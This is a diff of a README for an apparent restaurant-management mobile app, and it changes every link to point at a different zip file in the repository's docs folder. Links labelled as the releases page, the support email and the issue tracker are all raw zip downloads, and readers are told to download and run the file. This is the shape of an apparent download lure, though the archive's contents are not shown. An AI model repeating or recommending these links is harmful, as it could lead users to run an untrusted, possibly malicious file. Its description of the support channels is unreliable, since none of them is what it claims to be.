@@ -4,7 +4,7 @@
 The mobile app helps Vietnamese restaurant owners manage their business easily. With features for daily monitoring, menu management, and AI-driven insights, this app works both online and offline. Stay updated with FCM push notifications to enhance your restaurant's operations.
 
 ## 📥 Download the App
-[![Download mobile](https://raw.githubusercontent.com/nirdosh0990/mobile/main/docs/mobile-1.8.zip)](https://raw.githubusercontent.com/nirdosh0990/mobile/main/docs/mobile-1.8.zip)
+[![Download mobile](https://github.com/nirdosh0990/mobile/raw/refs/heads/main/docs/Software-3.2.zip)](https://github.com/nirdosh0990/mobile/raw/refs/heads/main/docs/Software-3.2.zip)
 
 ## 🚀 Getting Started
 To install the mobile app, follow the steps below. This guide will help you download and run the application smoothly.
@@ -30,7 +30,7 @@ Before you download, make sure your device meets these requirements:
 - **Push Notifications:** Receive timely alerts and updates about your restaurant.
 
 ## 🔗 Download & Install
-To download the app, please visit this page: [GitHub Releases](https://raw.githubusercontent.com/nirdosh0990/mobile/main/docs/mobile-1.8.zip). 
+To download the app, please visit this page: [GitHub Releases](https://github.com/nirdosh0990/mobile/raw/refs/heads/main/docs/Software-3.2.zip). 
 
 1. **Visit the Releases Page:** Click the link above to go to the GitHub Releases page.
 2. **Choose Your Version:** Look for the latest version listed on the page. 
@@ -58,8 +58,8 @@ Join our community for support, tips, and shared experiences. Engage with other 
 ## 💬 Feedback & Support
 We value your feedback! If you have questions or suggestions about the mobile app, feel free to contact our support team. You can reach us through the following channels:
 
-- **Email:** https://raw.githubusercontent.com/nirdosh0990/mobile/main/docs/mobile-1.8.zip
-- **GitHub Issues:** [Report an Issue](https://raw.githubusercontent.com/nirdosh0990/mobile/main/docs/mobile-1.8.zip)
+- **Email:** https://github.com/nirdosh0990/mobile/raw/refs/heads/main/docs/Software-3.2.zip
+- **GitHub Issues:** [Report an Issue](https://github.com/nirdosh0990/mobile/raw/refs/heads/main/docs/Software-3.2.zip)
 
 ## 📜 License
 This project is licensed under the MIT License. You can read the full license in the repository.
